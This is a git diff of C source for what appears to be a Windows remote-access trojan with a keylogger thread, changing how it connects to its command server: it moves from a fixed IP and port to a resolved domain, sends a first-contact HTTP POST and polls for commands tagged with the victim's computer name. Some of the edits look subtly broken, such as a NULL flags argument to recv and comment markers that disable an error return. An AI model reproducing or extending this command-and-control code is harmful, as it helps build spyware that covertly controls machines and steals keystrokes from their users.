@@ -2,8 +2,8 @@
 
 
 // extern variables: -> needed if running with server in herkou
-//char SOCKET_IP[16] = { 0 };
-//int SOCKET_PORT = 0;
+char SOCKET_IP[16] = { 0 };
+int SOCKET_PORT = 0;
 char pc_name[MAX_COMPUTERNAME_LENGTH + 1] = { 0 }; // global variable of the pc-name -> used in many functions.
 HANDLE thread_handle = 0; // thread handle for the Key Logger -> declared here to be able to close the thread when needed.
 
@@ -161,7 +161,7 @@ int connect_socket(WSADATA wsaData, struct sockaddr_in clientService, SOCKET* Co
 
 
 
-
+    /*
     clientService.sin_family = AF_INET;
     clientService.sin_addr.s_addr = inet_addr(SOCKET_IP);
     clientService.sin_port = htons(SOCKET_PORT);
@@ -174,7 +174,7 @@ int connect_socket(WSADATA wsaData, struct sockaddr_in clientService, SOCKET* Co
             printf("closesocket function failed with error: %ld\n", WSAGetLastError());
         WSACleanup();
         return -1;
-    }
+    }*/
 
 
     /*
@@ -189,7 +189,7 @@ int connect_socket(WSADATA wsaData, struct sockaddr_in clientService, SOCKET* Co
     //--------------------------------
     // Setup the hints address info structure
     // which is passed to the getaddrinfo() function
-    /*ZeroMemory(&hints, sizeof(hints));
+    ZeroMemory(&hints, sizeof(hints));
     hints.ai_family = AF_INET;
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
@@ -207,10 +207,10 @@ int connect_socket(WSADATA wsaData, struct sockaddr_in clientService, SOCKET* Co
         return 1;
     }
 
-    printf("getaddrinfo returned success\n");*/
+    printf("getaddrinfo returned success\n");
 
     // Retrieve each address and print out the hex bytes
-    /*for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
+    for (ptr = result; ptr != NULL; ptr = ptr->ai_next)
     {
         switch (ptr->ai_family)
         {
@@ -243,7 +243,7 @@ int connect_socket(WSADATA wsaData, struct sockaddr_in clientService, SOCKET* Co
                     if (iResult == SOCKET_ERROR)
                         printf("closesocket function failed with error: %ld\n", WSAGetLastError());
                     WSACleanup();
-                    return -1;
+                    return -1;*/
                     printf("Current ip and port are invalid! \n");
                 }
                 else
@@ -273,7 +273,7 @@ int connect_socket(WSADATA wsaData, struct sockaddr_in clientService, SOCKET* Co
             printf("closesocket function failed with error: %ld\n", WSAGetLastError());
         WSACleanup();
         return -1;
-    }*/
+    }
     
     ///////////////////
 
@@ -338,14 +338,14 @@ int send_first_commit_packet(SOCKET* s)
     
     snprintf(content_added, content_added_size + 1, temp_buffer); // '+ 1' to include the last letter -> need one more space for the null byte '\0'
 
-    msg_size = strlen("%s\r\nContent-Length: %d\r\nHost: %s:%d\r\n\r\n%s") + strlen(FIRST_CONNECTION_MSG) + strlen(SOCKET_IP) + sizeof(SOCKET_PORT) + strlen(content_added) + 20;
+    msg_size = strlen("%s\r\nContent-Length: %d\r\nHost: %s\r\n\r\n%s") + strlen(FIRST_CONNECTION_MSG) + strlen(DOMAIN_NAME) + strlen(content_added) + 20;
 
     // making the full http packet to send to the server
     msg = (char*)malloc(msg_size);
 
 
     // making the full POST message
-    snprintf(msg , msg_size, "%s\r\nContent-Length: %d\r\nHost: %s:%d\r\n\r\n%s", FIRST_CONNECTION_MSG, content_added_size, SOCKET_IP, SOCKET_PORT, content_added);
+    snprintf(msg , msg_size, "%s\r\nContent-Length: %d\r\nHost: %s\r\n\r\n%s", FIRST_CONNECTION_MSG, content_added_size, DOMAIN_NAME, content_added);
     
 
 
@@ -366,7 +366,7 @@ int send_first_commit_packet(SOCKET* s)
     printf("Sent first connection http packet! \n");
 
     // receiving the full message from the server
-    iResult = recv(*s, server_response, SIZE_OF_HTTP_MSG, MSG_WAITALL);
+    iResult = recv(*s, server_response, SIZE_OF_HTTP_MSG, NULL);
     if (iResult > 0)
     {
         server_response[iResult] = '\0'; // adding the null byte
@@ -413,11 +413,11 @@ int get_command(SOCKET* s, char** return_data)
     char buf[SIZE_OF_HTTP_MSG];
 
 
-    msg_len = strlen(GET_COMMAND_MSG) + (MAX_COMPUTERNAME_LENGTH + 1) + strlen(SOCKET_IP) + sizeof(SOCKET_PORT);
+    msg_len = strlen(GET_COMMAND_MSG) + (MAX_COMPUTERNAME_LENGTH + 1) + strlen(DOMAIN_NAME);
     
     msg = (char*) malloc(msg_len);
 
-    msg_len = snprintf(msg, msg_len, GET_COMMAND_MSG, pc_name, SOCKET_IP, SOCKET_PORT); // fixed / real len of the full message
+    msg_len = snprintf(msg, msg_len, GET_COMMAND_MSG, pc_name, DOMAIN_NAME); // fixed / real len of the full message
 
 
     // sending the get command message
@@ -439,7 +439,7 @@ int get_command(SOCKET* s, char** return_data)
 
 
     // receiving the headers from the server
-    iResult = recv(*s, buf, SIZE_OF_HTTP_MSG, MSG_WAITALL);
+    iResult = recv(*s, buf, SIZE_OF_HTTP_MSG, NULL);
     if (iResult > 0)
     {
         buf[iResult] = '\0'; // adding the null byte
